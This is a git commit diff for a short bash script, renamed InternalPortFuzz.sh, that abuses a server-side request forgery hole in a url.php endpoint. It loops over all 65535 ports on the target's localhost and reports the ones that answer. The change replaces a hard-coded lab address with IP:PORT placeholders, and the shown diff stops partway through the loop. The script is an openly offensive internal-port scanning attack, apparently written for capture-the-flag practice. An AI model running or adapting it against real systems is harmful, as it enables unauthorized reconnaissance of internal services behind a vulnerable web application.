5ef2573c337532128239b4d87a57f22e034d0888
kyle <kyle41111@gmail.com>
2021-10-23 17:03:26 -0400

    Update and rename script.sh to InternalPortFuzz.sh

--- InternalPortFuzz.sh
+++ InternalPortFuzz.sh
@@ -1,5 +1,5 @@
 for i in {0..65535}; do 
-  res=$(curl -s http://10.10.10.55:60000/url.php?path=http%3A%2F%2F127.0.0.1%3A${i});
+  res=$(curl -s http://IP:PORT/url.php?path=http%3A%2F%2F127.0.0.1%3A${i});
   len=$(echo $res | wc -w); 
   if [ "$len" -gt "0" ]; then
     echo -n "${i}: "; 
